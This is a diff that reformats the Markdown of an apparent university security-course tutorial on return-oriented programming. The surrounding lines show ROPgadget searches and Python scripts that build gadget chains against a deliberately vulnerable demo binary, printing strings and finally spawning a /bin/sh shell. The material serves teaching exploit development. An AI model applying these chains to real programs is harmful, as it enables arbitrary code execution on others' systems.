 seperating out the pop eax instructions:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./ROPgadget.py --binary ./vulnerable | grep ": pop eax "
 0x0808f020 : pop eax ; adc al, -0x7b ; sal byte ptr [edx + ecx + 0xffffffc1], cl ; retf
 0x080a9926 : pop eax ; adc al, 0x39 ; ret
@@ -1574,7 +1545,7 @@ user@si485H-base:demo$ ./ROPgadget.py --binary ./vulnerable | grep ": pop eax "
 In the list, indicated with an "\<---", you see the `pop eax;ret` we
 found earlier. Now we only need to find `mov [edx],eax` instruction:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./ROPgadget.py --binary ./vulnerable | grep ": mov dword ptr \[edx\]"
 0x080e62a9 : mov dword ptr [edx], cs ; push cs ; adc al, 0x41 ; ret
 0x080e3b65 : mov dword ptr [edx], cs ; push cs ; adc al, 0x43 ; ret
@@ -1599,7 +1570,7 @@ in it, but we can also find one that does the same, but with a `pop ebx`
 in the middle without a 0x09 in the address. So now we have the
 following, where we use 0xdeadbeef to pop into ebx
 
-``` {.example}
+``` example
 p += pack('<I', 0x0806e97a) #pop edx; ret
 p += pack('<I', 0x080ea060) #address to write to
 p += pack('<I', 0x080bb746) #pop eax; reat;
@@ -1616,7 +1587,7 @@ p += pack('<I', 0xcafebabe) #  will segfault here
 
 And if we run this, we see we segfault on cafebabe, hurray!
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
 Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`F?
                                                                                                                         AAAAﾭ?zaﾭ޾???
@@ -1625,14 +1596,13 @@ user@si485H-base:demo$ dmesg | tail -1
 [1560517.099344] vulnerable[10793]: segfault at cafebabe ip cafebabe sp bffff64c error 15
 ```
 
-Completing the Exploit
-======================
+# Completing the Exploit
 
 Now that you've seen what the game is like, we can finish this exploit
 and write an 'A' to stdout. At this point it is only a matter of finding
 the right gadgets:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ cat print_A_rop.py
 #!/usr/bin/python
 
@@ -1675,7 +1645,7 @@ print p
 
 And then we can run it:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable `python print_A_rop.py`
 Buf: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++z`F?
                                                                                                                         AAAAﾭަ??????]`z??????@????
@@ -1686,8 +1656,7 @@ user@si485H-base:demo$ dmesg | tail -1
 
 And you see, there's our A!
 
-Printing a Sequence of Chars
-----------------------------
+## Printing a Sequence of Chars
 
 Now that we can print an "A", let's try and print something a bit more
 exciting, like "Go Navy"\` At this point, we have successfully created
@@ -1699,7 +1668,7 @@ The cool thing is now that we have the infrastructure, we can just make
 functions out of these. That is, we can make a function that produces a
 ROP chain that does our task, and then we can just chain those together:
 
-```python
+``` python
 #!/usr/bin/python
 
 import sys
@@ -1801,12 +1770,11 @@ if __name__ == "__main__":
     p += pack('<I', 0xcafebabe) # <-- segfault here
 
     print p 
-
 ```
 
 And it works:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable `python print_string_rop.py "Go Navy, Beat Army!"`
 Buf: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++z`F?
                                                                                                                         GGGGﾭަ??????]`z??????@z`F?
@@ -1834,8 +1802,7 @@ user@si485H-base:demo$ dmesg | tail -1
 [1565900.040307] vulnerable[11345]: segfault at cafebabe ip cafebabe sp bffff654 error 15
 ```
 
-Launching a shell
------------------
+## Launching a shell
 
 We actually have everything we need to also launch a shell. It is the
 same as writing an 'A' but now we also have to set up the other
@@ -1848,7 +1815,7 @@ registers slightly differently. Recall, this is what we need:
 
 We can do that.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ cat shell_rop.py
 from struct import pack
 
@@ -1904,7 +1871,7 @@ p += pack('<I', 0x0806f040) # int 0x80; ret
 print p
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable `python shell_rop.py`
 Buf: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++z`F?
                                                                                                                         /binﾭ?zdF?
@@ -1912,12 +1879,11 @@ z?????@?                                                                        
 $ echo "Go Navy, Beat Army!"
 Go Navy, Beat Army!
 $ 
-
 ```
 
 THE END!
 
-[^1]: Much of the ROP examples are adapted from
-    [CodeArcanna](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
-    article by Alex Reese, Tue 28 May 2013.
+[1] Much of the ROP examples are adapted from
+[CodeArcanna](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
+article by Alex Reese, Tue 28 May 2013.
 
